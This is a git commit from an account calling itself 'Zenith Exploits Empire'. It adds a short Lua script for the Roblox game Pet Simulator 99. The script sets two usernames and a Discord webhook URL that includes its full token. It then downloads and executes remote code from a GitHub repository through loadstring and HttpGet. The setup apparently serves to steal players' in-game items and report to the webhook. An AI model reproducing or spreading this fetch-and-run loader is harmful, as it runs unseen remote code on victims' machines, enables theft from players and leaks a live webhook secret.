aeacfd6686f92aa11f8b33c2d2349cca92065875
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-20 00:05:45 +0200

    Added ps99 script: MyBot.1234567890

---
+++ ps99/MyBot.1234567890.lua
@@ -0,0 +1,5 @@
+Username = "DaBird_Bedwars"
+Username2 = "DaBird_Bedwars"
+Webhook = "https://discord.com/api/webhooks/1363273734189748314/RR7DhKGEfG0Tf-YnCc4Afad7DEili7ZhhlzlHvsL4gNUrSDlEk-kmKq6-ndDz4_bli8E"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%2099"))()
